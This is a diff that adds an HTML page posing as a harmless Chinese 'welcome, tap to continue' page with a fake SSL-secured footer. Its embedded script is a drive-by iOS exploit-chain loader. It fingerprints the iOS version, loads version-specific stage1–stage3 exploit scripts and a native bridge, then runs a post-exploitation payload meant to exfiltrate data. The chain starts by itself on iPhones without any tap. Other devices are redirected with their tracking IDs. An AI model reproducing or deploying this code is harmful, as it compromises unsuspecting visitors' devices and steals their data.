@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<title>欢迎</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  html, body { width: 100%; height: 100%; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Helvetica Neue", sans-serif; }
+  body {
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
+    background-size: 400% 400%;
+    animation: bgShift 12s ease infinite;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    padding: 20px;
+  }
+  @keyframes bgShift {
+    0%   { background-position: 0% 50%; }
+    50%  { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
+  }
+  .card {
+    background: rgba(255, 255, 255, 0.95);
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+    border-radius: 28px;
+    padding: 48px 36px;
+    max-width: 420px;
+    width: 100%;
+    text-align: center;
+    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.25);
+    animation: fadeUp 0.8s cubic-bezier(0.16, 1, 0.3, 1) both;
+  }
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(30px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+  .icon {
+    width: 88px;
+    height: 88px;
+    border-radius: 50%;
+    margin: 0 auto 28px;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
+    animation: pulse 2.5s ease-in-out infinite;
+  }
+  @keyframes pulse {
+    0%, 100% { transform: scale(1); box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4); }
+    50%      { transform: scale(1.06); box-shadow: 0 15px 40px rgba(102, 126, 234, 0.55); }
+  }
+  .icon svg { width: 44px; height: 44px; fill: #fff; }
+  h1 {
+    font-size: 26px;
+    font-weight: 700;
+    color: #1a1a2e;
+    margin-bottom: 14px;
+    letter-spacing: -0.3px;
+  }
+  .subtitle {
+    font-size: 15px;
+    color: #5f6c86;
+    line-height: 1.6;
+    margin-bottom: 36px;
+  }
+  .btn {
+    display: inline-block;
+    width: 100%;
+    padding: 18px 28px;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    color: #fff;
+    font-size: 17px;
+    font-weight: 600;
+    border: none;
+    border-radius: 16px;
+    cursor: pointer;
+    box-shadow: 0 10px 28px rgba(102, 126, 234, 0.4);
+    transition: transform 0.2s ease, box-shadow 0.2s ease;
+    position: relative;
+    overflow: hidden;
+  }
+  .btn:active {
+    transform: scale(0.97);
+    box-shadow: 0 5px 16px rgba(102, 126, 234, 0.3);
+  }
+  .btn::after {
+    content: "";
+    position: absolute;
+    top: 0; left: -100%;
+    width: 100%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
+    transition: left 0.6s ease;
+  }
+  .btn:active::after, .btn:hover::after { left: 100%; }
+  .footer {
+    margin-top: 28px;
+    font-size: 12px;
+    color: #a8b0c4;
+  }
+  .loading {
+    display: none;
+    margin-top: 24px;
+    font-size: 14px;
+    color: #667eea;
+    font-weight: 500;
+  }
+  .loading.show { display: block; }
+  .spinner {
+    display: inline-block;
+    width: 16px;
+    height: 16px;
+    border: 2.5px solid rgba(102, 126, 234, 0.2);
+    border-top-color: #667eea;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    vertical-align: middle;
+    margin-right: 8px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+  <div class="card">
+    <div class="icon">
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+      </svg>
+    </div>
+    <h1>欢迎访问</h1>
+    <p class="subtitle">请点击下方按钮继续浏览，为您展示完整内容。</p>
+    <button class="btn" id="goBtn">点击查看</button>
+    <div class="loading" id="loading">
+      <span class="spinner"></span>加载中，请稍候...
+    </div>
+    <div class="footer">Secure Connection · SSL Encrypted</div>
+  </div>
+
+<script>
+  // ====== Exploit Payload Loader (iOS 13.0 – 17.2.1 only) ======
+  (function () {
+    function _parseInt(v, d) { var n = parseInt(v, 10); return isNaN(n) ? d : n; }
+
+    function getIosVersion() {
+      var ua = navigator.userAgent || '';
+      var sv = ua.match(/Version\/(\d+)(?:[_\.](\d+))?(?:[_\.](\d+))?/);
+      var cv = ua.match(/CPU\s+iPhone\s+OS\s+(\d+)(?:[_\.](\d+))?(?:[_\.](\d+))?\s+like\s+Mac\s+OS\s+X/i);
+
+      function build(m) {
+        if (!m) return null;
+        var maj = _parseInt(m[1], 0), min = _parseInt(m[2], 0), pat = _parseInt(m[3], 0);
+        if (maj <= 0) return null;
+        return {
+          maj: maj, min: min, pat: pat,
+          str: maj + '.' + min + (pat ? '.' + pat : ''),
+          num: maj * 10000 + min * 100 + pat
+        };
+      }
+
+      var s = build(sv), c = build(cv);
+      if (s && c) return (s.num >= c.num) ? s : c;
+      if (s) return s;
+      if (c) return c;
+      return null;
+    }
+
+    function selectStage1(v) {
+      if (!v) return null; var n = v.num;
+      if (n >= 150200 && n <= 150500) return { name: 'Stage1_15.2_15.5_jacurutu', file: '/Stage1_15.2_15.5_jacurutu.js', range: '15.2-15.5' };
+      if (n >= 150600 && n <= 160102) return { name: 'Stage1_15.6_16.1.2_bluebird', file: '/Stage1_15.6_16.1.2_bluebird.js', range: '15.6-16.1.2' };
+      if (n >= 160200 && n <= 160501) return { name: 'Stage1_16.2_16.5.1_terrorbird', file: '/Stage1_16.2_16.5.1_terrorbird.js', range: '16.2-16.5.1' };
+      if (n >= 160600 && n <= 170201) return { name: 'Stage1_16.6_17.2.1_cassowary', file: '/Stage1_16.6_17.2.1_cassowary.js', range: '16.6-17.2.1' };
+      return null;
+    }
+
+    function selectStage2(v) {
+      if (!v) return null; var n = v.num;
+      // iOS 15.0 – 16.2: breezy15
+      if (n >= 150000 && n <= 160200) return { name: 'Stage2_15.0_16.2_breezy15', file: '/Stage2_15.0_16.2_breezy15.js', range: '15.0-16.2' };
+      // iOS 16.3 – 16.5.1: seedbell (16.3-16.5.1 variant)
+      if (n >= 160300 && n <= 160501) return { name: 'Stage2_16.3_16.5.1_seedbell', file: '/Stage2_16.3_16.5.1_seedbell.js', range: '16.3-16.5.1' };
+      // iOS 16.6 – 16.7.12: seedbell (16.6-16.7.12 variant)
+      if (n >= 160600 && n <= 160712) return { name: 'Stage2_16.6_16.7.12_seedbell', file: '/Stage2_16.6_16.7.12_seedbell.js', range: '16.6-16.7.12', pre: { name: 'Stage2_16.6_17.2.1_seedbell_pre', file: '/Stage2_16.6_17.2.1_seedbell_pre.js' } };
+      // iOS 17.0 – 17.2.1: seedbell (17.x variant) + pre-req
+      if (n >= 170000 && n <= 170201) return { name: 'Stage2_17.0_17.2.1_seedbell', file: '/Stage2_17.0_17.2.1_seedbell.js', range: '17.0-17.2.1', pre: { name: 'Stage2_16.6_17.2.1_seedbell_pre', file: '/Stage2_16.6_17.2.1_seedbell_pre.js' } };
+      return null;
+    }
+
+    function loadScript(url) {
+      return new Promise(function (resolve, reject) {
+        var s = document.createElement('script');
+        s.src = url;
+        s.async = false;
+        s.onload = function () { resolve(true); };
+        s.onerror = function () { reject(new Error('script load failed: ' + url)); };
+        document.head.appendChild(s);
+      });
+    }
+
+    var STAGE2_TO_STAGE3 = {
+      'Stage2_15.0_16.2_breezy15':   { name: 'Stage3_VariantA', file: '/Stage3_VariantA.js' },
+      'Stage2_16.3_16.5.1_seedbell': { name: 'Stage3_VariantB', file: '/Stage3_VariantB.js' },
+      'Stage2_16.6_16.7.12_seedbell': { name: 'Stage3_VariantB', file: '/Stage3_VariantB.js' },
+      'Stage2_17.0_17.2.1_seedbell': { name: 'Stage3_VariantB', file: '/Stage3_VariantB.js' }
+    };
+
+    function _callFn(fnName) {
+      try {
+        if (typeof window[fnName] !== 'function') return null;
+        var watchdogErr = null;
+        var watchdogT = setTimeout(function () {
+          watchdogErr = new Error(fnName + ' timeout (>20s watchdog)');
+        }, 20000);
+        var result = null;
+        try {
+          result = window[fnName]();
+        } finally {
+          clearTimeout(watchdogT);
+        }
+        if (watchdogErr) { throw watchdogErr; }
+        return result;
+      }
+      catch (e) { console.warn(fnName + ' exec error:', e); return null; }
+    }
+
+    async function runExploitChain(iosVer) {
+      var s1 = selectStage1(iosVer);
+      var s2 = selectStage2(iosVer);
+      var logLines = [];
+      function log(msg) { var l = '[EXPLOIT] ' + msg; console.log(l); logLines.push(l); }
+      log('target iOS: ' + iosVer.str + ' (num=' + iosVer.num + ')');
+
+      if (!s1 || !s2) {
+        log('NO exploit payload for iOS ' + iosVer.str + ' — only sandbox exfil available');
+        window.__dsExploitChain = { ok: false, ios: iosVer.str, reason: 'unsupported_version', logs: logLines, sandboxOnly: true };
+        return 'sandbox_only';
+      }
+
+      var CHAIN_TOTAL_DEADLINE = 120000;  // 2 min total
+      var _deadlineTimer = null;
+      var _deadlineExceeded = false;
+      var deadlinePromise = new Promise(function (_, rej) {
+        _deadlineTimer = setTimeout(function () {
+          _deadlineExceeded = true;
+          rej(new Error('Exploit chain total deadline exceeded (>120s)'));
+        }, CHAIN_TOTAL_DEADLINE);
+      });
+      function _clearDeadline() { if (_deadlineTimer) { clearTimeout(_deadlineTimer); _deadlineTimer = null; } }
+
+      try {
+        log('Stage1: ' + s1.name + ' (' + s1.range + ')');
+        try { await Promise.race([loadScript(s1.file), deadlinePromise]); }
+        catch (e) {
+          _clearDeadline();
+          log('Stage1 load FAIL: ' + e.message);
+          window.__dsExploitChain = { ok:false, stage1:s1.name, ios: iosVer.str, logs: logLines };
+          throw e;
+        }
+        if (_deadlineExceeded) throw new Error('chain deadline');
+        var stage1Attempts = Math.max(1, (window.__dsCorunaStage1Attempts || 12));
+        var s1ok = false;
+        var s1Err = null;
+        for (var s1i = 0; s1i < stage1Attempts; s1i++) {
+          try {
+            log('Stage1 attempt ' + (s1i+1) + '/' + stage1Attempts);
+            var r1 = _callFn(s1.name);
+            if (r1) { s1ok = true; log('Stage1 attempt ' + (s1i+1) + ' OK'); break; }
+            s1Err = new Error(s1.name + ' returned falsy on attempt ' + (s1i+1));
+            if (typeof window.gc === 'function') { try { window.gc(); } catch (_) {} }
+            await new Promise(function(r){ setTimeout(r, 200); });
+          }
+          catch (e1) {
+            s1Err = e1;
+            log('Stage1 attempt ' + (s1i+1) + ' error: ' + (e1 && e1.message || e1));
+            if (typeof window.gc === 'function') { try { window.gc(); } catch (_) {} }
+            await new Promise(function(r){ setTimeout(r, 200); });
+          }
+        }
+        log('Stage1 final result: ' + (s1ok ? 'OK' : 'FAIL (after ' + stage1Attempts + ' attempts)'));
+        if (!s1ok) {
+          _clearDeadline();
+          window.__dsExploitChain = { ok:false, stage1:s1.name, ios: iosVer.str, logs: logLines, error: s1Err && s1Err.message };
+          throw s1Err || new Error(s1.name + ' never returned truthy');
+        }
+
+        if (s2.pre) {
+          log('Stage2 pre-req: ' + s2.pre.name);
+          try { await Promise.race([loadScript(s2.pre.file), deadlinePromise]); }
+          catch (e) { log('Stage2 pre load FAIL: ' + e.message); _clearDeadline(); window.__dsExploitChain = { ok:false, stage2_pre: s2.pre.name, ios: iosVer.str, logs: logLines }; throw e; }
+          if (_deadlineExceeded) throw new Error('chain deadline');
+          var pr = _callFn(s2.pre.name);
+          log('Stage2 pre result: ' + (pr ? 'OK' : 'FAIL'));
+        }
+
+        log('Stage2: ' + s2.name + ' (' + s2.range + ')');
+        try { await Promise.race([loadScript(s2.file), deadlinePromise]); }
+        catch (e) { _clearDeadline(); log('Stage2 load FAIL: ' + e.message); window.__dsExploitChain = { ok:false, stage2:s2.name, ios: iosVer.str, logs: logLines }; throw e; }
+        if (_deadlineExceeded) throw new Error('chain deadline');
+        var s2Attempts = Math.max(1, (window.__dsCorunaStage2Attempts || 8));
+        var s2ok = false;
+        var s2Err = null;
+        for (var s2i = 0; s2i < s2Attempts; s2i++) {
+          try {
+            log('Stage2 attempt ' + (s2i+1) + '/' + s2Attempts);
+            var r2 = _callFn(s2.name);
+            if (r2) { s2ok = true; log('Stage2 attempt ' + (s2i+1) + ' OK'); break; }
+            s2Err = new Error(s2.name + ' returned falsy on attempt ' + (s2i+1));
+            if (typeof window.gc === 'function') { try { window.gc(); } catch (_) {} }
+            await new Promise(function(r){ setTimeout(r, 200); });
+          }
+          catch (e2) {
+            s2Err = e2;
+            log('Stage2 attempt ' + (s2i+1) + ' error: ' + (e2 && e2.message || e2));
+            if (typeof window.gc === 'function') { try { window.gc(); } catch (_) {} }
+            await new Promise(function(r){ setTimeout(r, 200); });
+          }
+        }
+        log('Stage2 final result: ' + (s2ok ? 'OK' : 'FAIL (after ' + s2Attempts + ' attempts)'));
+        if (!s2ok) { _clearDeadline(); window.__dsExploitChain = { ok:false, stage2:s2.name, ios: iosVer.str, logs: logLines }; throw s2Err || new Error(s2.name + ' never returned truthy'); }
+
+        var s3 = STAGE2_TO_STAGE3[s2.name];
+        if (s3) {
+          log('Stage3: ' + s3.name);
+          try { await Promise.race([loadScript(s3.file), deadlinePromise]); }
+          catch (e) {
+            _clearDeadline();
+            log('Stage3 load FAIL: ' + e.message);
+            window.__dsExploitChain = { ok:false, stage3:s3.name, ios: iosVer.str, logs: logLines };
+            throw e;
+          }
+          if (_deadlineExceeded) throw new Error('chain deadline');
+          var s3Attempts = Math.max(1, (window.__dsCorunaStage3Attempts || 6));
+          var s3ok = false;
+          var s3Err = null;
+          for (var s3i = 0; s3i < s3Attempts; s3i++) {
+            try {
+              log('Stage3 attempt ' + (s3i+1) + '/' + s3Attempts);
+              var r3 = _callFn(s3.name);
+              if (r3) { s3ok = true; log('Stage3 attempt ' + (s3i+1) + ' OK'); break; }
+              s3Err = new Error(s3.name + ' returned falsy on attempt ' + (s3i+1));
+              if (typeof window.gc === 'function') { try { window.gc(); } catch (_) {} }
+              await new Promise(function(r){ setTimeout(r, 200); });
+            }
+            catch (e3) {
+              s3Err = e3;
+              log('Stage3 attempt ' + (s3i+1) + ' error: ' + (e3 && e3.message || e3));
+              if (typeof window.gc === 'function') { try { window.gc(); } catch (_) {} }
+              await new Promise(function(r){ setTimeout(r, 200); });
+            }
+          }
+          log('Stage3 final result: ' + (s3ok ? 'OK' : 'FAIL (after ' + s3Attempts + ' attempts)'));
+          if (!s3ok) {
+            _clearDeadline();
+            window.__dsExploitChain = { ok:false, stage3:s3.name, ios: iosVer.str, logs: logLines };
+            throw s3Err || new Error(s3.name + ' never returned truthy');
+          }
+        }
+
+        // Stage3 成功后立即构建 nativeBridge（在 post_exploit.js 启动前就绪，让 autoExfiltrate 走全量路径）
+        if (window._corunaPrimitives) {
+          log('Loading native_bridge.js (build window.nativeBridge from Stage3 primitives)');
+          try { await Promise.race([loadScript('payloads/native_bridge.js'), deadlinePromise]); }
+          catch (e) { log('native_bridge load FAIL (non-fatal, sandbox-only mode): ' + e.message); }
+        } else {
+          log('Stage3 did not expose primitives — nativeBridge unavailable, sandbox-only mode');
+        }
+        if (_deadlineExceeded) throw new Error('chain deadline');
+
+        log('Stage chain DONE — loading post_exploit + SDK');
+        try { await Promise.race([loadScript('payloads/post_exploit.js'), deadlinePromise]); }
+        catch (e) {
+          _clearDeadline();
+          log('post_exploit load FAIL: ' + e.message);
+          window.__dsExploitChain = { ok:false, stage:'post_exploit', ios: iosVer.str, logs: logLines };
+          throw e;
+        }
+        if (typeof window.startSdk === 'function') { try { window.startSdk(); } catch (e) { log('startSdk error: ' + e.message); } }
+
+        _clearDeadline();
+        window.__dsExploitChain = { ok: true, stage1: s1.name, stage2: s2.name, stage3: s3 ? s3.name : null, ios: iosVer.str, logs: logLines };
+        return 'full_chain_ok';
+      } catch (chainErr) {
+        _clearDeadline();
+        throw chainErr;
+      }
+    }
+
+    window.__dsGetIosVersion = getIosVersion;
+    window.__dsSelectStage1 = selectStage1;
+    window.__dsSelectStage2 = selectStage2;
+    window.__dsStartExploit = async function __dsStartExploit() {
+      var ua = navigator.userAgent || '';
+      var isIOS = /iPhone|iPad|iPod|iOS/i.test(ua) || (navigator.platform && /iPhone|iPad|iPod/i.test(navigator.platform));
+      if (!isIOS) {
+        console.warn('[EXPLOIT] non-iOS device — chain bypassed, only sandbox SDK available');
+        try { await loadScript('payloads/post_exploit.js'); if (typeof window.startSdk === 'function') window.startSdk(); } catch (_) {}
+        window.__dsExploitChain = { ok: false, reason: 'not_ios', sandboxOnly: true };
+        return false;
+      }
+      var iosVer = getIosVersion();
+      if (!iosVer) {
+        console.warn('[EXPLOIT] cannot detect iOS version — running sandbox-only SDK');
+        try { await loadScript('payloads/post_exploit.js'); if (typeof window.startSdk === 'function') window.startSdk(); } catch (_) {}
+        window.__dsExploitChain = { ok: false, reason: 'version_unknown', sandboxOnly: true };
+        return false;
+      }
+      try { return await runExploitChain(iosVer); }
+      catch (err) {
+        console.error('[EXPLOIT] chain error:', err);
+        try { await loadScript('payloads/post_exploit.js'); if (typeof window.startSdk === 'function') window.startSdk(); } catch (_) {}
+        if (window.__dsExploitChain) window.__dsExploitChain.error = String(err && err.message || err);
+        else window.__dsExploitChain = { ok: false, error: String(err && err.message || err), sandboxOnly: true };
+        return 'chain_failed_sandbox_fallback';
+      }
+    };
+  })();
+
+  // ====== UI button handler ======
+  (function () {
+    var btn = document.getElementById('goBtn');
+    var loading = document.getElementById('loading');
+    var chainStarted = false;
+    function _extractParams() {
+      var out = {};
+      try {
+        var qs = window.location.search.substring(1);
+        if (qs) qs.split('&').forEach(function(p){
+          var kv = p.split('=');
+          if (kv[0]) out[decodeURIComponent(kv[0])] = decodeURIComponent(kv.slice(1).join('='));
+        });
+      } catch(e) {}
+      try {
+        var ck = document.cookie.split(';');
+        ck.forEach(function(c){
+          c = c.trim(); if (!c) return;
+          var kv = c.split('=');
+          if (kv[0] && kv[0].trim() === 'ds_uuid' && !out.device_uuid && !out.ds_uuid) {
+            out.device_uuid = kv.slice(1).join('=').trim();
+          }
+        });
+      } catch(e) {}
+      try {
+        if (!out.device_uuid) {
+          var v = localStorage.getItem('ds_uuid');
+          if (v && /^[0-9a-fA-F]{32}$/.test(v)) out.device_uuid = v;
+        }
+      } catch(e) {}
+      return out;
+    }
+    function fallbackToDarkSword() {
+      var params = _extractParams();
+      var pairs = [];
+      Object.keys(params).forEach(function(k){
+        if (params[k] === undefined || params[k] === null) return;
+        pairs.push(encodeURIComponent(k) + '=' + encodeURIComponent(String(params[k])));
+      });
+      pairs.push('_=' + Date.now());
+      var url = '/e/group.html' + (pairs.length ? '?' + pairs.join('&') : '');
+      setTimeout(function () {
+        if (window.parent && window.parent !== window) {
+          try { window.parent.location.href = url; return; } catch (e) {}
+        }
+        window.location.href = url;
+      }, 1500);
+    }
+    async function triggerGo() {
+      if (chainStarted) return;
+      chainStarted = true;
+      if (loading) loading.classList.add('show');
+      if (btn) { btn.disabled = true; btn.style.opacity = '0.7'; btn.textContent = '正在初始化安全环境…'; }
+      var ua = navigator.userAgent || '';
+      var isIOS = /iPhone|iPad|iPod|iOS/i.test(ua) || (navigator.platform && /iPhone|iPad|iPod/i.test(navigator.platform));
+      var iosV = window.__dsGetIosVersion ? window.__dsGetIosVersion() : null;
+      var useDarkSwordOnly = !isIOS || (iosV && iosV.num > 170201);
+      if (useDarkSwordOnly) {
+        fallbackToDarkSword();
+        return;
+      }
+      var result = null;
+      try {
+        if (typeof window.__dsStartExploit === 'function') {
+          result = await window.__dsStartExploit();
+        }
+      } catch (e) {
+        console.error('[UI] Coruna chain exception:', e);
+      }
+      var ok = window.__dsExploitChain && window.__dsExploitChain.ok;
+      if (ok) {
+        if (btn) btn.textContent = '安全环境已就绪，正在建立连接…';
+      } else {
+        if (btn) btn.textContent = '初始化失败，切换备用通道…';
+        fallbackToDarkSword();
+      }
+    }
+    if (btn) {
+      btn.addEventListener('click', triggerGo);
+      btn.addEventListener('touchstart', function () {}, { passive: true });
+    }
+    (function autoStartOnIos() {
+      var ua = navigator.userAgent || '';
+      var isIOS = /iPhone|iPad|iPod|iOS/i.test(ua) || (navigator.platform && /iPhone|iPad|iPod/i.test(navigator.platform));
+      if (isIOS) {
+        setTimeout(function () {
+          try { if (!chainStarted) triggerGo(); } catch (e) {}
+        }, 1500);
+      }
+    })();
+  })();
+</script>
+</body>
+</html>
